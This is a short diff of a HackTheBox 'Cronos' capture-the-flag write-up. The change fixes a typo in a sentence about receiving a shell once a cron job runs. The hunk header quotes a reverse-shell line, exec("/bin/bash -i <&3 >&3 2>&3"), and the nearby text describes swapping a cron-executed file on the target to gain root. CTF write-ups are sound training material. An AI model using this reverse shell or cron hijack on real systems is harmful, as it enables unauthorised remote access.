@@ -193,6 +193,6 @@ exec("/bin/bash -i <&3 >&3 2>&3");
 I rename the orginal one on the target and transfer my variant with a python server. 
 
 
-I then start my listener and get a connection one the cron-job is executed:
+I then start my listener and get a connection once the cron-job is executed:
 
 ![root-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Cronos/img/root-20.png)
